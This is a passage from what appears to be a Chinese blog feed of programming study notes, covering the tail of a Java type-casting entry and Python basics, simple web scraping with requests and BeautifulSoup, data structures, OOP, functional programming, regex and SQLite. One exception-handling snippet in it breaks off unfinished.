变量中。</p><p>需要注意的几点事项：</p><ol><li>强制类型转换可能会导致数据损失。例如，将一个大范围的整数转换为一个小范围的整数时，可能会导致溢出。</li><li>强制类型转换应该谨慎使用，因为它可能会导致运行时错误或不确定的行为。你应该确保转换是安全的，不会导致数据丢失或错误的结果。</li><li>在某些情况下，Java会自动执行隐式类型转换，但在其他情况下，你需要显式地使用强制类型转换。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python学习笔记</title>
      <link href="/NANABLOG/2023/12/11/python/"/>
      <url>/NANABLOG/2023/12/11/python/</url>
      
        <content type="html"><![CDATA[<h2 id="Python基本语句代码介绍"><a href="#Python基本语句代码介绍" class="headerlink" title="Python基本语句代码介绍"></a>Python基本语句代码介绍</h2><h3 id="1-打印输出"><a href="#1-打印输出" class="headerlink" title="1. 打印输出"></a>1. 打印输出</h3><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">"Hello, World!"</span>)</span><br></pre></td></tr></tbody></table></figure><h3 id="2-变量赋值"><a href="#2-变量赋值" class="headerlink" title="2. 变量赋值"></a>2. 变量赋值</h3><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">x = <span class="number">10</span></span><br><span class="line">name = <span class="string">"Alice"</span></span><br></pre></td></tr></tbody></table></figure><h3 id="3-条件语句"><a href="#3-条件语句" class="headerlink" title="3. 条件语句"></a>3. 条件语句</h3><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> x &gt; <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"x大于5"</span>)</span><br><span class="line"><span class="keyword">elif</span> x == <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"x等于5"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"x小于5"</span>)</span><br></pre></td></tr></tbody></table></figure><h3 id="4-循环语句"><a href="#4-循环语句" class="headerlink" title="4. 循环语句"></a>4. 循环语句</h3><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">    x -= <span class="number">1</span></span><br></pre></td></tr></tbody></table></figure><h3 id="5-列表操作"><a href="#5-列表操作" class="headerlink" title="5. 列表操作"></a>5. 列表操作</h3><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(numbers[<span class="number">0</span>])       <span class="comment"># 输出：1</span></span><br><span class="line">numbers.append(<span class="number">6</span>)       <span class="comment"># 添加元素</span></span><br><span class="line">numbers.pop()           <span class="comment"># 移除最后一个元素</span></span><br></pre></td></tr></tbody></table></figure><h3 id="6-字典操作"><a href="#6-字典操作" class="headerlink" title="6. 字典操作"></a>6. 字典操作</h3><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">person = {<span class="string">"name"</span>: <span class="string">"Bob"</span>, <span class="string">"age"</span>: <span class="number">30</span>}</span><br><span class="line"><span class="built_in">print</span>(person[<span class="string">"name"</span>])   <span class="comment"># 输出："Bob"</span></span><br><span class="line">person[<span class="string">"occupation"</span>] = <span class="string">"Engineer"</span>  <span class="comment"># 添加新键值对</span></span><br></pre></td></tr></tbody></table></figure><h3 id="7-函数定义与调用"><a href="#7-函数定义与调用" class="headerlink" title="7. 函数定义与调用"></a>7. 函数定义与调用</h3><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Hello, "</span> + name + <span class="string">"!"</span>)</span><br><span class="line"></span><br><span class="line">greet(<span class="string">"Tom"</span>)</span><br></pre></td></tr></tbody></table></figure><h3 id="8-异常处理"><a href="#8-异常处理" class="headerlink" title="8. 异常处理"></a>8. 异常处理</h3><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    result = <span class="number">10</span> / <span class="number">0</span></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"除以零错误"</span>)</span><br></pre></td></tr></tbody></table></figure><h3 id="9-导入模块"><a href="#9-导入模块" class="headerlink" title="9. 导入模块"></a>9. 导入模块</h3><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="built_in">print</span>(math.sqrt(<span class="number">16</span>))   <span class="comment"># 输出：4.0</span></span><br></pre></td></tr></tbody></table></figure><h2 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h2><p>当涉及使用Python进行网络爬虫时，以下是一些基本的代码片段和概念，帮助你入门。请注意，爬取网站的内容时需要遵守网站的使用条款和法律法规。</p><h3 id="1-导入所需库"><a href="#1-导入所需库" class="headerlink" title="1. 导入所需库"></a>1. 导入所需库</h3><p>首先，你需要导入所需的Python库。常用的库包括：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br></pre></td></tr></tbody></table></figure><ul><li><code>requests</code> 库用于发送HTTP请求和接收响应。</li><li><code>BeautifulSoup</code> 用于解析HTML文档，从中提取数据。</li></ul><h3 id="2-发送HTTP请求获取页面内容"><a href="#2-发送HTTP请求获取页面内容" class="headerlink" title="2. 发送HTTP请求获取页面内容"></a>2. 发送HTTP请求获取页面内容</h3><p>使用 <code>requests</code> 库发送HTTP请求，获取网页内容：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">url = <span class="string">'https://example.com'</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    html_content = response.content</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Failed to retrieve the page"</span>)</span><br></pre></td></tr></tbody></table></figure><h3 id="3-解析HTML内容"><a href="#3-解析HTML内容" class="headerlink" title="3. 解析HTML内容"></a>3. 解析HTML内容</h3><p>使用 <code>BeautifulSoup</code> 解析获取的HTML内容，从中提取所需的信息：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">soup = BeautifulSoup(html_content, <span class="string">'html.parser'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 例如提取标题</span></span><br><span class="line">title = soup.title.text</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Title:"</span>, title)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 例如提取所有链接</span></span><br><span class="line">links = soup.find_all(<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">    <span class="built_in">print</span>(link.get(<span class="string">'href'</span>))</span><br></pre></td></tr></tbody></table></figure><h3 id="4-使用CSS选择器定位元素"><a href="#4-使用CSS选择器定位元素" class="headerlink" title="4. 使用CSS选择器定位元素"></a>4. 使用CSS选择器定位元素</h3><p>你可以使用CSS选择器来定位HTML元素：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 例如找到所有具有特定CSS类的元素</span></span><br><span class="line">elements = soup.select(<span class="string">'.class-name'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> elements:</span><br><span class="line">    <span class="built_in">print</span>(element.text)</span><br></pre></td></tr></tbody></table></figure><h3 id="5-处理数据"><a href="#5-处理数据" class="headerlink" title="5. 处理数据"></a>5. 处理数据</h3><p>爬取的数据通常需要进一步处理，例如存储到文件或数据库中：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 例如将数据存储到文本文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'data.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(title + <span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">        file.write(link.get(<span class="string">'href'</span>) + <span class="string">'\n'</span>)</span><br></pre></td></tr></tbody></table></figure><h3 id="6-添加延时和异常处理"><a href="#6-添加延时和异常处理" class="headerlink" title="6. 添加延时和异常处理"></a>6. 添加延时和异常处理</h3><p>为了避免给服务器造成过大的负载，最好在爬取过程中添加一些延时。此外，需要处理可能出现的异常情况：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加延时</span></span><br><span class="line">time.sleep(<span class="number">2</span>)  <span class="comment"># 等待2秒</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 异常处理</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    response.raise_for_status()  <span class="comment"># 如果请求不成功，会抛出异常</span></span><br><span class="line">    html_content = response.content</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Error:"</span>, e)</span><br></pre></td></tr></tbody></table></figure><h1 id="学习编程基础"><a href="#学习编程基础" class="headerlink" title="学习编程基础"></a>学习编程基础</h1><h2 id="1-1-编程基本概念"><a href="#1-1-编程基本概念" class="headerlink" title="1.1 编程基本概念"></a>1.1 编程基本概念</h2><p><strong>变量、数据类型、表达式和语句</strong></p><ul><li><p><strong>变量</strong>：在Python中，变量用于存储数据。变量名是标识符，可以是字母、数字和下划线的组合，但不能以数字开头。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">age = <span class="number">25</span></span><br><span class="line">name = <span class="string">"Alice"</span></span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>数据类型</strong>：Python有多种数据类型，包括整数（int）、浮点数（float）、字符串（str）、布尔值（bool）等。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">num = <span class="number">42</span></span><br><span class="line">price = <span class="number">9.99</span></span><br><span class="line">message = <span class="string">"Hello, World!"</span></span><br><span class="line">is_valid = <span class="literal">True</span></span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>表达式和语句</strong>：表达式是由操作数和运算符组成的式子，而语句是执行某个操作的一组代码。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span> = num1 + num2  <span class="comment"># 表达式</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Welcome!"</span>)  <span class="comment"># 语句</span></span><br></pre></td></tr></tbody></table></figure></li></ul><h2 id="1-2-安装Python和开发环境"><a href="#1-2-安装Python和开发环境" class="headerlink" title="1.2 安装Python和开发环境"></a>1.2 安装Python和开发环境</h2><p><strong>安装Python解释器和选择开发环境</strong></p><ol><li>下载并安装Python 3.x版本：<a href="https://www.python.org/downloads/">Python官网</a></li><li>选择一个集成开发环境（IDE）或文本编辑器，如PyCharm、VSCode等。</li></ol><h2 id="1-3-第一个程序"><a href="#1-3-第一个程序" class="headerlink" title="1.3 第一个程序"></a>1.3 第一个程序</h2><p><strong>编写”Hello, World!”程序</strong></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">"Hello, World!"</span>)</span><br></pre></td></tr></tbody></table></figure><h2 id="1-4-基本语法"><a href="#1-4-基本语法" class="headerlink" title="1.4 基本语法"></a>1.4 基本语法</h2><p><strong>学习Python的缩进规则</strong></p><ul><li>Python使用缩进来表示代码块，缩进的空格数目必须一致。</li></ul><p><strong>定义函数、条件语句、循环语句</strong></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Long name!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Short name!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></tbody></table></figure><h1 id="学习数据结构和算法"><a href="#学习数据结构和算法" class="headerlink" title="学习数据结构和算法"></a>学习数据结构和算法</h1><h2 id="2-1-列表和元组"><a href="#2-1-列表和元组" class="headerlink" title="2.1 列表和元组"></a>2.1 列表和元组</h2><p><strong>创建、访问和修改列表和元组</strong></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">my_tuple = (<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(my_list[<span class="number">2</span>])  <span class="comment"># 访问列表元素</span></span><br><span class="line">my_tuple[<span class="number">1</span>] = <span class="number">25</span>   <span class="comment"># 错误！元组不可修改</span></span><br></pre></td></tr></tbody></table></figure><p><strong>常用方法和操作</strong></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">my_list.append(<span class="number">6</span>)       <span class="comment"># 添加元素到列表末尾</span></span><br><span class="line">my_tuple.index(<span class="number">20</span>)      <span class="comment"># 查找元素在元组中的索引</span></span><br><span class="line"><span class="built_in">len</span>(my_list)            <span class="comment"># 获取列表长度</span></span><br></pre></td></tr></tbody></table></figure><h2 id="2-2-字典和集合"><a href="#2-2-字典和集合" class="headerlink" title="2.2 字典和集合"></a>2.2 字典和集合</h2><p><strong>使用字典和集合</strong></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">my_dict = {<span class="string">"name"</span>: <span class="string">"Alice"</span>, <span class="string">"age"</span>: <span class="number">30</span>}</span><br><span class="line">my_set = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>}</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(my_dict[<span class="string">"name"</span>])  <span class="comment"># 访问字典值</span></span><br><span class="line">my_set.add(<span class="number">6</span>)           <span class="comment"># 添加元素到集合</span></span><br></pre></td></tr></tbody></table></figure><p><strong>常用方法和操作</strong></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">my_dict.keys()       <span class="comment"># 获取所有键</span></span><br><span class="line">my_set.remove(<span class="number">3</span>)     <span class="comment"># 移除元素</span></span><br></pre></td></tr></tbody></table></figure><h2 id="2-3-字符串操作"><a href="#2-3-字符串操作" class="headerlink" title="2.3 字符串操作"></a>2.3 字符串操作</h2><p><strong>字符串基本操作</strong></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">greeting = <span class="string">"Hello"</span></span><br><span class="line">name = <span class="string">"Alice"</span></span><br><span class="line">message = greeting + <span class="string">", "</span> + name  <span class="comment"># 字符串拼接</span></span><br><span class="line">substring = message[<span class="number">7</span>:]           <span class="comment"># 切片操作</span></span><br><span class="line">formatted = <span class="string">"My name is {}"</span>.<span class="built_in">format</span>(name)  <span class="comment"># 格式化字符串</span></span><br></pre></td></tr></tbody></table></figure><h2 id="2-4-文件操作"><a href="#2-4-文件操作" class="headerlink" title="2.4 文件操作"></a>2.4 文件操作</h2><p><strong>读取和写入文件</strong></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 读取文本文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"file.txt"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    content = file.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入文本文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"output.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">"Hello, File!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取二进制文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"image.jpg"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    image_data = file.read()</span><br></pre></td></tr></tbody></table></figure><h2 id="2-5-基本算法"><a href="#2-5-基本算法" class="headerlink" title="2.5 基本算法"></a>2.5 基本算法</h2><p><strong>搜索算法和排序算法</strong></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 线性搜索</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">linear_search</span>(<span class="params">arr, target</span>):</span><br><span class="line">    <span class="keyword">for</span> i, num <span class="keyword">in</span> <span class="built_in">enumerate</span>(arr):</span><br><span class="line">        <span class="keyword">if</span> num == target:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 快速排序</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quick_sort</span>(<span class="params">arr</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(arr) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> arr</span><br><span class="line">    pivot = arr[<span class="built_in">len</span>(arr) // <span class="number">2</span>]</span><br><span class="line">    left = [x <span class="keyword">for</span> x <span class="keyword">in</span> arr <span class="keyword">if</span> x &lt; pivot]</span><br><span class="line">    middle = [x <span class="keyword">for</span> x <span class="keyword">in</span> arr <span class="keyword">if</span> x == pivot]</span><br><span class="line">    right = [x <span class="keyword">for</span> x <span class="keyword">in</span> arr <span class="keyword">if</span> x &gt; pivot]</span><br><span class="line">    <span class="keyword">return</span> quick_sort(left) + middle + quick_sort(right)</span><br></pre></td></tr></tbody></table></figure><h1 id="学习面向对象编程（OOP）"><a href="#学习面向对象编程（OOP）" class="headerlink" title="学习面向对象编程（OOP）"></a>学习面向对象编程（OOP）</h1><h2 id="3-1-类和对象"><a href="#3-1-类和对象" class="headerlink" title="3.1 类和对象"></a>3.1 类和对象</h2><p><strong>创建类和对象</strong></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bark</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"<span class="subst">{self.name}</span> is barking!"</span>)</span><br><span class="line"></span><br><span class="line">my_dog = Dog(<span class="string">"Buddy"</span>)</span><br><span class="line">my_dog.bark()</span><br></pre></td></tr></tbody></table></figure><h2 id="3-2-封装、继承和多态"><a href="#3-2-封装、继承和多态" class="headerlink" title="3.2 封装、继承和多态"></a>3.2 封装、继承和多态</h2><p><strong>封装、继承和多态的概念</strong></p><ul><li>封装：隐藏对象的内部实现细节，只暴露必要的接口。</li><li>继承：从已有的类创建新类，继承现有类的属性和方法。</li><li>多态：不同类的对象可以共享相同的接口，但表现不同的行为。</li></ul><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Woof!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Meow!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">animal_speak</span>(<span class="params">animal</span>):</span><br><span class="line">    animal.speak()</span><br><span class="line"></span><br><span class="line">my_dog = Dog()</span><br><span class="line">my_cat = Cat()</span><br><span class="line"></span><br><span class="line">animal_speak(my_dog)  <span class="comment"># 输出 "Woof!"</span></span><br><span class="line">animal_speak(my_cat)  <span class="comment"># 输出 "Meow!"</span></span><br></pre></td></tr></tbody></table></figure><h1 id="学习文件操作和异常处理"><a href="#学习文件操作和异常处理" class="headerlink" title="学习文件操作和异常处理"></a>学习文件操作和异常处理</h1><h2 id="4-1-文件操作"><a href="#4-1-文件操作" class="headerlink" title="4.1 文件操作"></a>4.1 文件操作</h2><p><strong>深入学习文件操作</strong></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 读取文本文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"file.txt"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    lines = file.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入文本文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"output.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.writelines(lines)</span><br></pre></td></tr></tbody></table></figure><h2 id="4-2-异常处理"><a href="#4-2-异常处理" class="headerlink" title="4.2 异常处理"></a>4.2 异常处理</h2><p><strong>处理异常</strong></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">"Enter a</span></span><br></pre></td></tr></tbody></table></figure><h1 id="模块和包"><a href="#模块和包" class="headerlink" title="模块和包"></a>模块和包</h1><h2 id="模块的组织和使用"><a href="#模块的组织和使用" class="headerlink" title="模块的组织和使用"></a>模块的组织和使用</h2><p>在Python中，模块是将代码组织成文件的一种方式，有助于代码的可维护性和复用性。下面是一个简单的例子，展示如何创建和使用模块。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一个名为mymodule.py的模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mymodule.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f"Hello, <span class="subst">{name}</span>!"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在另一个文件中使用模块</span></span><br><span class="line"><span class="keyword">import</span> mymodule</span><br><span class="line"></span><br><span class="line">message = mymodule.greet(<span class="string">"Alice"</span>)</span><br><span class="line"><span class="built_in">print</span>(message)  <span class="comment"># 输出：Hello, Alice!</span></span><br></pre></td></tr></tbody></table></figure><h2 id="包的创建和使用"><a href="#包的创建和使用" class="headerlink" title="包的创建和使用"></a>包的创建和使用</h2><p>包是一种更高级的模块组织方式，可以将相关的模块组织在一起，形成一个文件夹层级结构。下面是一个包的示例：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">mypackage/</span><br><span class="line">    __init__.py</span><br><span class="line">    module1.py</span><br><span class="line">    module2.py</span><br></pre></td></tr></tbody></table></figure><p><code>__init__.py</code> 是包的初始化文件，可以为空。模块 <code>module1</code> 和 <code>module2</code> 是包内的模块。</p><h1 id="函数式编程"><a href="#函数式编程" class="headerlink" title="函数式编程"></a>函数式编程</h1><p>函数式编程是一种编程范式，强调使用函数来进行计算和操作。以下是一些函数式编程的基本概念和函数的示例：</p><h2 id="Lambda函数"><a href="#Lambda函数" class="headerlink" title="Lambda函数"></a>Lambda函数</h2><p>Lambda函数是一种匿名函数，通常用于简单的操作。例如：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 使用Lambda函数将列表中的每个元素平方</span></span><br><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">squared = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x**<span class="number">2</span>, numbers))</span><br><span class="line"><span class="built_in">print</span>(squared)  <span class="comment"># 输出：[1, 4, 9, 16, 25]</span></span><br></pre></td></tr></tbody></table></figure><h2 id="map、filter和reduce函数"><a href="#map、filter和reduce函数" class="headerlink" title="map、filter和reduce函数"></a>map、filter和reduce函数</h2><ul><li><code>map</code> 函数可以将一个函数应用到可迭代对象的每个元素上。</li></ul><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 使用map函数将列表中的数字转为字符串</span></span><br><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">strings = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">str</span>, numbers))</span><br><span class="line"><span class="built_in">print</span>(strings)  <span class="comment"># 输出：['1', '2', '3', '4', '5']</span></span><br></pre></td></tr></tbody></table></figure><ul><li><code>filter</code> 函数用于过滤可迭代对象中的元素。</li></ul><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 使用filter函数过滤列表中的偶数</span></span><br><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">evens = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x % <span class="number">2</span> == <span class="number">0</span>, numbers))</span><br><span class="line"><span class="built_in">print</span>(evens)  <span class="comment"># 输出：[2, 4]</span></span><br></pre></td></tr></tbody></table></figure><ul><li><code>reduce</code> 函数在Python 3中被移到 <code>functools</code> 模块下，它对可迭代对象中的元素进行累积操作。</li></ul><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 使用reduce函数计算列表中元素的累积乘积</span></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">product = reduce(<span class="keyword">lambda</span> x, y: x * y, numbers)</span><br><span class="line"><span class="built_in">print</span>(product)  <span class="comment"># 输出：120</span></span><br></pre></td></tr></tbody></table></figure><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>正则表达式是用于字符串匹配和处理的强大工具。以下是一个简单的正则表达式示例：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找匹配的单词</span></span><br><span class="line">text = <span class="string">"Hello, my name is Alice."</span></span><br><span class="line">pattern = <span class="string">r'\b\w+\b'</span>  <span class="comment"># 匹配单词边界上的字符</span></span><br><span class="line">matches = re.findall(pattern, text)</span><br><span class="line"><span class="built_in">print</span>(matches)  <span class="comment"># 输出：['Hello', 'my', 'name', 'is', 'Alice']</span></span><br></pre></td></tr></tbody></table></figure><h1 id="数据库连接"><a href="#数据库连接" class="headerlink" title="数据库连接"></a>数据库连接</h1><p>连接和操作数据库是在许多应用中必不可少的一部分。以下是一个使用SQLite数据库的示例：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到数据库（如果不存在则会创建）</span></span><br><span class="line">conn = sqlite3.connect(<span class="string">'mydatabase.db'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建游标对象</span></span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建表</span></span><br><span class="line">cursor.execute(<span class="string">'''CREATE TABLE IF NOT EXISTS users </span></span><br><span class="line"><span class="string">                  (id INTEGER PRIMARY KEY, name TEXT, age INTEGER)'''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入数据</span></span><br><span class="line">cursor.execute(<span class="string">"INSERT INTO users (name, age) VALUES (?, ?)"</span>, (<span class="string">'Alice'</span>, <span class="number">25</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交更改</span></span><br><span class="line">conn.commit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询数据</span></span><br><span class="line">cursor.execute(<span class="string">"SELECT * FROM users"</span>)</span><br><span class="line">data = cursor.fetchall()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭连接</span></span><br><span class="line">conn.close()</span><br></pre></td></tr></tbody></table></figure><h1 id="Web开发（可选）"><a href="#Web开发（可选）" class="headerlink" title="Web开发（可选）"></a>Web开发（可选）</h1><h2 id="前端基础"><a href="#前端基础" class="headerlink" 